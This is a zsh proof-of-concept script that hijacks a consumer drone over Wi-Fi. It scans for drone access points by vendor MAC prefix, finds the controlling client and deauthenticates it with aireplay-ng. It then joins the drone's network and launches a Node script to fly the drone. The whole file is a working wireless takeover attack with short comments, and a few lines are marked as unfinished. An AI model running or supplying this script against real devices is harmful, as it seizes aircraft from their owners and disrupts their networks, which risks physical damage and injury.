#!/bin/zsh
#
#
#THIS IS AN EXPERIMENTAL FILE. This was done as a proof-of-concept early on in the project.
#This file is re-made into the entire project but is left here for documentation purposes
#
#
airmon-ng start wlan0 >>/dev/null #puts into monitor mode
sleep 2
rm test* #removes files with test
echo "searching for access points in the area"
INT=`ifconfig | grep "wlan0" | cut -d : -f1` #INT pulls the name of the interface of the wireless network adapter being used
airodump-ng $INT --output-format csv -w test >>/dev/null & #airodump hops to different channels to listen to beacon packets to advertise what the network is; changes the output format to csv; csv just adds commas between fields (comma separated variables); -w changes the name of the file to be test-01.csv
me=$! #looks at previous process id
# $? returns the return code of the previous command
sleep 15 #wait 15 seconds
kill $me #kills the previous process with the id stored in $

name=`cat test-01.csv | grep -E '90:3A:E6|00:12:1C|90:03:B7|A0:14:3D|00:26:7E' |cut -d , -f 14`   #-d is delimiter; -f 14 is the field or column number
echo -e "\tdrone wifi name is $name" #-E tells computer to look for the tab "/t"
mac=`cat test-01.csv | grep -E $name |cut -d , -f 1` #grep -E is to use egrep (version 2 of grep)
echo -e "\tmac address is $mac" #prints the mac address
channel=`cat test-01.csv | grep -E $name |cut -d , -f 4` #switches the channel 
echo "searching for client in control of the drone"

rm test* 
airodump-ng $INT --bssid $mac -a --output-format csv -w test >>/dev/null & #airodump moves in between channels; & runs as background process
me=$!
sleep 15
kill $me 
client=`tail -n 2 test-01.csv | cut -d ,  -f 1` 
# back ticks mean executing whatever is in between
echo -e "\tswitching to channel $channel"
#airmon-ng start $INT $channel >>/dev/null #changes channel
airmon-ng start wlan0mon 6 >>/dev/null #remove this line later
echo -e "\tthe client is at $client"
echo "deauthenticating client"
#/dev/null is an empty file that you would throw in values that you dont want printed
aireplay-ng $INT -0 5 -a $mac -c $client  #disconnects client from the network; search man -0 
echo -e "\nswitching out of monitor mode to associate with drone"
airmon-ng stop wlan0mon >>/dev/null #fix this :)
sleep 2
echo "making ourselves client of the drone"
iwconfig wlan0 essid "ardrone2_v2.4.8"
#iwconfig wlan0 essid "ImaginaryDrone"
sleep 10
echo "we now have control of the drone >:)"
echo -e "\n\n\n\t\t\t\t\t\t\t\t\t\tflyyyyyyyyyyy!!!!!!!!"
sleep 10

node hello-ar-drone.js &
id=$!
sleep 10
kill $id
